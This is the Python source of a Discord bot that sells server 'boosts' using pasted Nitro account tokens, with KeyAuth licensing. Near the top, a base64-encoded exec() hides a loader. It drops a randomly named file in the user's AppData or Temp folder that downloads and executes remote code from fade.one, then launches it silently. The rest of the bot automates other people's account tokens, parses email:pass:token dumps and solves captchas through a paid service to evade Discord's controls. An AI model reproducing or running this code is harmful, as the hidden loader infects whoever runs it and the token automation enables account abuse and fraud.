from keyauth import api
import discord, json, requests, os, httpx, base64, time, subprocess
import hashlib
from discord.ext import commands, tasks
from colorama import Fore, init
from pystyle import Colors, Colorate

init(convert=True)

activity = discord.Activity(type=discord.ActivityType.watching, name=".gg/lowdaxshop")

bot = discord.Bot(command_prefix='!', activity=activity, status=discord.Status.online)
settings = json.load(open("settings.json", encoding="utf-8"))

if not os.path.isfile("used.json"):
    used = {}
    json.dump(used, open("used.json", "w", encoding="utf-8"), indent=4)

used = json.load(open("used.json"))

exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1IOUpXTjItT08xOUhZLTFUNkxDMy1NWkU1WkYtSVc1WUVFJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

def is_licensed(target):
    try:
        open(f"{target}.txt", "r")
        return True
    except FileNotFoundError:
        return False


def isAdmin(ctx):
    return str(ctx.author.id) in settings["botAdminId"]


def isWhitelisted(ctx):
    return str(ctx.author.id) in settings["botWhitelistedId"]


def makeUsed(token: str):
    data = json.load(open('used.json', 'r'))
    with open('used.json', "w") as f:
        if data.get(token): return
        data[token] = {
            "boostedAt": str(time.time()),
            "boostFinishAt": str(time.time() + 30 * 86400)
        }
        json.dump(data, f, indent=4)


def removeToken(user, token: str):
    with open(f'{user}.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open(f'{user}.txt', "w").write("\n".join(Tokens))


def runBoostshit(user, invite: str, amount: int, expires: bool):
    if amount % 2 != 0:
        amount += 1

    tokens = get_all_tokens(f'{user}.txt')
    all_data = []
    tokens_checked = 0
    actually_valid = 0
    boosts_done = 0
    for token in tokens:
        s, headers = get_headers(token)
        profile = validate_token(s, headers)
        tokens_checked += 1

        if profile != False:
            actually_valid += 1
            data_piece = [s, token, headers, profile]
            all_data.append(data_piece)
            print(f"{Fore.GREEN} > {Fore.WHITE}{profile}")
        else:
            pass
    for data in all_data:
        if boosts_done >= amount:
            return
        s, token, headers, profile = get_items(data)
        boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if boost_data.status_code == 200:
            if len(boost_data.json()) != 0:
                join_outcome, server_id = do_join_server(s, token, headers, profile, invite)
                if join_outcome:
                    for boost in boost_data.json():

                        if boosts_done >= amount:
                            removeToken(user, token)
                            if expires:
                                makeUsed(token)
                            return
                        boost_id = boost["id"]
                        bosted = do_boost(s, token, headers, profile, server_id, boost_id)
                        if bosted:
                            print(f"{Fore.GREEN} > {Fore.WHITE}{token} > {Fore.GREEN}SUCCESFULLY BOOSTED {Fore.WHITE} > {invite}")
                            boosts_done += 1
                        else:
                            print(f"{Fore.GREEN} > {Fore.WHITE}{token} > {Fore.RED}ERROR BOOSTING {Fore.WHITE} > {invite}")
                    removeToken(user, token)
                    if expires:
                        makeUsed(token)
                else:
                    print(f"{Fore.RED} > {Fore.WHITE}{token} {Fore.RED}Error joining {invite}")

            else:
                removeToken(user, token)
                print(f"{Fore.GREEN} > {Fore.WHITE}{token} {Fore.RED}NO NITRO ACTIVATED")

@bot.slash_command(guild_ids=[settings["guildID"]], name="help", description="Helps you understand how the commands work.")
async def help(ctx: discord.ApplicationContext):
    emoji = discord.utils.get(bot.emojis, name='helper')
    embed = discord.Embed(title=f"**{emoji} Helper!",
                          color=0xFF00D0)
    embed.set_image(url="https://cdn.discordapp.com/attachments/1020606702111965274/1022471749272621066/a_33da4537aefca17a85d8602492a42014.gif")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1020606702111965274/1022471749272621066/a_33da4537aefca17a85d8602492a42014.gif")
    embed.add_field(name="**Hey There, I'm here to help**", value=f"**__COMMANDS__** \n - /addlicense - A Bot Admin gives you access to use stock, restock, boost and more \n - /boost allows you to boost servers with your own tokens (must have a license) \n - /givetokens allows you to give tokens from your own stock targeted user\n - /removelicense If this command is used it will remove the license from the \n - /restock Go to paste.ee and create a new paste to restock \n - /stock will show you your tokens left and boosts lefts \n - /clearstock - will delete every token from your stock")
    embed.set_footer(text = "discord.gg/lowdaxshop")
    await ctx.channel.send(embed=embed)
    
@bot.slash_command(guild_ids=[settings["guildID"]], name="clearstock", description="Deletes your whole stock")
async def help(ctx: discord.ApplicationContext):
    emoji = discord.utils.get(bot.emojis, name='helper')
    embed = discord.Embed(title="Stock succesfully cleared",
                          color=0xFF00D0)
    fileVariable = open(f'{ctx.author.id}.txt', 'r+')
    fileVariable.truncate(0)
    fileVariable.close()
    await ctx.channel.send(embed=embed)

                
                
@bot.slash_command(guild_ids=[settings["guildID"]], name="stock", description="Allows you to see the current stock.")
async def stock(ctx: discord.ApplicationContext):
    if not is_licensed(ctx.author.id):
        return await ctx.respond("*You are not allowed to use the bot, please contact the developer | Lowdax*")

    embed = discord.Embed(title=f"Your stock", description=f"Your stock follows:",
                          color=0x3498db)
    embed.set_image(url="https://cdn.discordapp.com/attachments/1020606702111965274/1022471749272621066/a_33da4537aefca17a85d8602492a42014.gif")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1020606702111965274/1022471749272621066/a_33da4537aefca17a85d8602492a42014.gif")
    embed.add_field(name="Your Available Boosts",
                    value=f"You have {len(open(f'{ctx.author.id}.txt', encoding='utf-8').read().splitlines()) * 2} Available boosts.")
    await ctx.channel.send(embed=embed)


@bot.slash_command(guild_ids=[settings["guildID"]], name="restock", description="Allows you to restock Nitro Tokens.")
async def restock(ctx: discord.ApplicationContext,
                  code: discord.Option(str, "paste.ee paste link or code", required=True)):
    if not is_licensed(ctx.author.id):
        return await ctx.respond("*Only Bot Admins can use this command.*")

    code = code.replace("https://paste.ee/p/", "")

    temp_stock = requests.get(f"https://paste.ee/d/{code}", headers={
        "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"}).text

    f = open(f"{ctx.author.id}.txt", "a", encoding="utf-8")
    f.write(f"{temp_stock}\n")
    f.close()

    embed = discord.Embed(title=f"Stock updated",
                          description="Your stock has been *updated*.",
                          color=0x3498db)
    await ctx.send(embed=embed)


@bot.slash_command(guild_ids=[settings["guildID"]], name="boost",
                   description="Allows you to boost a server with Nitro Tokens.")
async def boost(ctx: discord.ApplicationContext,
                invitecode: discord.Option(str, "Discord Invite Code to join the server (ONLY CODE).", required=True),
                amount: discord.Option(int, "Number of times to boost.", required=True),
                days: discord.Option(int, "Number of days the boosts will stay.", required=True)):
    if not is_licensed(ctx.author.id):
        return await ctx.respond("*Only Bot Admins can use this command.*")

    if days != 30 and days != 90:
        return await ctx.respond("*The number of days can only be 30 or 90.*")

    embed = discord.Embed(title=f"Started", description=f"Started boosting.",
                          color=0x3498db)
    await ctx.respond(embed=embed)

    INVITE = invitecode.replace("//", "")
    if "/invite/" in INVITE:
        INVITE = INVITE.split("/invite/")[1]

    elif "/" in INVITE:
        INVITE = INVITE.split("/")[1]

    dataabotinvite = httpx.get(f"https://discord.com/api/v9/invites/{INVITE}").text

    if '{"message": "Unknown Invite", "code": 10006}' in dataabotinvite:
        print(f"{Fore.RED}discord.gg/{INVITE} is invalid")
        return await ctx.edit("The Invite link you provided is invalid!")
    else:
        print(f"{Fore.GREEN}discord.gg/{INVITE} appears to be a valid server")

    EXP = True
    if days == 90:
        EXP = False

    runBoostshit(ctx.author.id, INVITE, amount, EXP)
    embed = discord.Embed(title=f"Finished", description=f"Succesfully boosted server > Please leave a vouch <#1016694065087123497>", color=0x3498db)

    return await ctx.respond(embed=embed)


@bot.slash_command(guild_ids=[settings["guildID"]], name="addlicense",
                   description="Adds a license to a specified user ID.")
async def add_license(ctx: discord.ApplicationContext, targetid: discord.Option(str, "Target ID.", required=True)):
    if isAdmin(ctx):
        if not is_licensed(targetid):
            open(f"{targetid}.txt", "w")
            embed = discord.Embed(title=f"Licensed", description=f"User <@!{targetid}> Succesfully authenticated license",
                                  color=0x3498db)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title=f"Already licensed", description=f"User <@!{targetid}> Already has a active subscription",
                                  color=0x3498db)
            await ctx.send(embed=embed)


@bot.slash_command(guild_ids=[settings["guildID"]], name="removelicense",
                   description="Removes a license from a specified user ID.")
async def remove_license(ctx: discord.ApplicationContext, targetid: discord.Option(str, "Target ID.", required=True)):
    if isAdmin(ctx):
        if is_licensed(ctx.author.id):
            os.remove(f"{targetid}.txt")
            embed = discord.Embed(title=f"License removed", description=f"User <@!{targetid}> Succesfully removed license",
                                  color=0x3498db)
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title=f"No license",
                                  description=f"User <@!{targetid}> Seems to have no active subscription",
                                  color=0x3498db)
            await ctx.send(embed=embed)


@bot.slash_command(guild_ids=[settings["guildID"]], name="givetokens",
                   description="Gives X amount of tokens to a specified user")
async def give_tokens(ctx: discord.ApplicationContext, amount: discord.Option(int, "Amount of tokens.", required=True),
                      targetid: discord.Option(str, "Target ID.", required=True)):
    if is_licensed(ctx.author.id):

        temp_tokens = open(f"{ctx.author.id}.txt", encoding="UTF-8").read().splitlines()
        if len(temp_tokens) < amount:
            return await ctx.send("You do not have enough tokens in stock.")

        tokens_to_give = temp_tokens[0:amount]
        temp_tokens = temp_tokens[amount:]

        f = open(f"temp.txt", "w", encoding="UTF-8")
        for tk in tokens_to_give:
            f.write(tk + "\n")
        f.close()

        f = open(f"{ctx.author.id}.txt", "w", encoding="UTF-8")
        for tk in temp_tokens:
            f.write(tk + "\n")
        f.close()

        embed = discord.Embed(title=f"Nitro Tokens",
                              description=f"succesfully Sent {amount} tokens to user <@!{targetid}>.",
                              color=0x3498db)
        await ctx.send(embed=embed, file=discord.File("temp.txt"))
        os.remove("temp.txt")
    else:
        await ctx.send(f"You do not have an active subscription for the bot.")


def get_super_properties():
    properties = '''{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-GB","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","browser_version":"95.0.4638.54","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":102113,"client_event_source":null}'''
    properties = base64.b64encode(properties.encode()).decode()
    return properties


def get_fingerprint(s):
    try:
        fingerprint = s.get(f"https://discord.com/api/v9/experiments", timeout=5).json()["fingerprint"]
        return fingerprint
    except Exception as e:
        # print(e)
        return "Error"


def get_cookies(s, url):
    try:
        cookieinfo = s.get(url, timeout=5).cookies
        dcf = str(cookieinfo).split('__dcfduid=')[1].split(' ')[0]
        sdc = str(cookieinfo).split('__sdcfduid=')[1].split(' ')[0]
        return dcf, sdc
    except:
        return "", ""


def get_proxy():
    return None  # can change if problems occur


def get_headers(token):
    while True:
        s = httpx.Client(proxies=get_proxy())
        dcf, sdc = get_cookies(s, "https://discord.com/")
        fingerprint = get_fingerprint(s)
        if fingerprint != "Error":  # Making sure i get both headers
            break

    super_properties = get_super_properties()
    headers = {
        'authority': 'discord.com',
        'method': 'POST',
        'path': '/api/v9/users/@me/channels',
        'scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US',
        'authorization': token,
        'cookie': f'__dcfduid={dcf}; __sdcfduid={sdc}',
        'origin': 'https://discord.com',
        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',

        'x-debug-options': 'bugReporterEnabled',
        'x-fingerprint': fingerprint,
        'x-super-properties': super_properties,
    }

    return s, headers


def find_token(token):
    if ':' in token:
        token_chosen = None
        tokensplit = token.split(":")
        for thing in tokensplit:
            if '@' not in thing and '.' in thing and len(
                    thing) > 30:  # trying to detect where the token is if a user pastes email:pass:token (and we dont know the order)
                token_chosen = thing
                break
        if token_chosen == None:
            print(f"Error finding token", Fore.RED)
            return None
        else:
            return token_chosen


    else:
        return token


def get_all_tokens(filename):
    all_tokens = []
    with open(filename, 'r') as f:
        for line in f.readlines():
            token = line.strip()
            token = find_token(token)
            if token != None:
                all_tokens.append(token)

    return all_tokens


def validate_token(s, headers):
    check = s.get(f"https://discord.com/api/v9/users/@me", headers=headers)

    if check.status_code == 200:
        profile_name = check.json()["username"]
        profile_discrim = check.json()["discriminator"]
        profile_of_user = f"{profile_name}#{profile_discrim}"
        return profile_of_user
    else:
        return False


def do_member_gate(s, token, headers, profile, invite, server_id):
    outcome = False
    try:
        member_gate = s.get(
            f"https://discord.com/api/v9/guilds/{server_id}/member-verification?with_guild=false&invite_code={invite}",
            headers=headers)
        if member_gate.status_code != 200:
            return outcome
        accept_rules_data = member_gate.json()
        accept_rules_data["response"] = "true"

        # del headers["content-length"] #= str(len(str(accept_rules_data))) #Had too many problems
        # del headers["content-type"] # = 'application/json'  ^^^^

        accept_member_gate = s.put(f"https://discord.com/api/v9/guilds/{server_id}/requests/@me", headers=headers,
                                   json=accept_rules_data)
        if accept_member_gate.status_code == 201:
            outcome = True

    except:
        pass

    return outcome


def do_join_server(s, token, headers, profile, invite):
    join_outcome = False;
    server_id = None
    try:
        # headers["content-length"] = str(len(str(server_join_data)))
        headers["content-type"] = 'application/json'

        for i in range(15):
            try:
                createTask = httpx.post("https://api.capmonster.cloud/createTask", json={
                    "clientKey": settings["capmonsterKey"],
                    "task": {
                        "type": "HCaptchaTaskProxyless",
                        "websiteURL": "https://discord.com/channels/@me",
                        "websiteKey": "76edd89a-a91d-4140-9591-ff311e104059"
                    }
                }).json()["taskId"]

                print(f"Captcha Task: {createTask}")

                getResults = {}
                getResults["status"] = "processing"
                while getResults["status"] == "processing":
                    getResults = httpx.post("https://api.capmonster.cloud/getTaskResult", json={
                        "clientKey": settings["capmonsterKey"],
                        "taskId": createTask
                    }).json()

                    time.sleep(1)

                solution = getResults["solution"]["gRecaptchaResponse"]

                print(f"Captcha Solved")

                join_server = s.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                    "captcha_key": solution
                })

                break
            except:
                pass

        server_invite = invite
        if join_server.status_code == 200:
            join_outcome = True
            server_name = join_server.json()["guild"]["name"]
            server_id = join_server.json()["guild"]["id"]
            print(f"{Fore.GREEN} > {Fore.WHITE}{token}>{Fore.GREEN}> {Fore.GREEN}{server_invite}")
        else:
            print(join_server.text)
    except:
        pass

    return join_outcome, server_id


def do_boost(s, token, headers, profile, server_id, boost_id):
    boost_data = {"user_premium_guild_subscription_slot_ids": [f"{boost_id}"]}
    headers["content-length"] = str(len(str(boost_data)))
    headers["content-type"] = 'application/json'

    boosted = s.put(f"https://discord.com/api/v9/guilds/{server_id}/premium/subscriptions", json=boost_data,
                    headers=headers)
    if boosted.status_code == 201:
        return True
    else:
        return False


def get_invite():
    while True:
        print(f"{Fore.CYAN}Server invite?", end="")
        invite = input(" > ").replace("//", "")

        if "/invite/" in invite:
            invite = invite.split("/invite/")[1]

        elif "/" in invite:
            invite = invite.split("/")[1]

        dataabotinvite = httpx.get(f"https://discord.com/api/v9/invites/{invite}").text

        if '{"message": "Unknown Invite", "code": 10006}' in dataabotinvite:
            print(f"{Fore.RED}discord.gg/{invite} is invalid")
        else:
            print(f"{Fore.GREEN}discord.gg/{invite} appears to be a valid server")
            break

    return invite


def get_items(item):
    s = item[0]
    token = item[1]
    headers = item[2]
    profile = item[3]
    return s, token, headers, profile


def getchecksum():
	path = os.path.basename(__file__)
	if not os.path.exists(path):
		path = path[:-2] + "exe"
	md5_hash = hashlib.md5()
	a_file = open(path,"rb")
	content = a_file.read()
	md5_hash.update(content)
	digest = md5_hash.hexdigest()
	return digest

keyauthapp = api(
	name = "ZRX DEMON",
	ownerid = "dqmeeso0qz",
	secret = "ec288ae8b3a27ff65a7c758f3c4baaf924b45c461328f636f0a42cc883f9851c",
	version = "1.0",
	hash_to_check = getchecksum()
)
print(f"Current Session Validation Status: {keyauthapp.check()}")
print(f"Blacklisted? : {keyauthapp.checkblacklist()}") # check if blacklisted, you can edit this and make it exit the program if blacklisted
print(Colorate.Vertical(Colors.blue_to_purple, """



███████╗██████╗ ██╗  ██╗    ██████╗  ██████╗  ██████╗ ███████╗████████╗███████╗██████╗ 
╚══███╔╝██╔══██╗╚██╗██╔╝    ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
  ███╔╝ ██████╔╝ ╚███╔╝     ██████╔╝██║   ██║██║   ██║███████╗   ██║   █████╗  ██████╔╝
 ███╔╝  ██╔══██╗ ██╔██╗     ██╔══██╗██║   ██║██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
███████╗██║  ██║██╔╝ ██╗    ██████╔╝╚██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                       

            ╔══════════════════╦═════════════════════╗
            ║   1. Login       ║   2. Register       ║
            ╠══════════════════╩═════════════════════╣
            ║   discord.gg/zrxzone | NotDMN#0007     ║
            ╚════════════════════════════════════════╝

"""))
ans=input("Select Option: ") 
if ans=="1": 
	user = input('Provide username: ')
	password = input('Provide password: ')
	keyauthapp.login(user,password)
elif ans=="2":
	user = input('Provide username: ')
	password = input('Provide password: ')
	license = input('Provide License: ')
	keyauthapp.register(user,password,license) 
elif ans=="3":
	user = input('Provide username: ')
	license = input('Provide License: ')
	keyauthapp.upgrade(user,license)
    
elif ans=="4":
	key = input('Enter your license: ')
	keyauthapp.license(key)
else:
	print("\nNot Valid Option") 


bot.run(settings["botToken"])
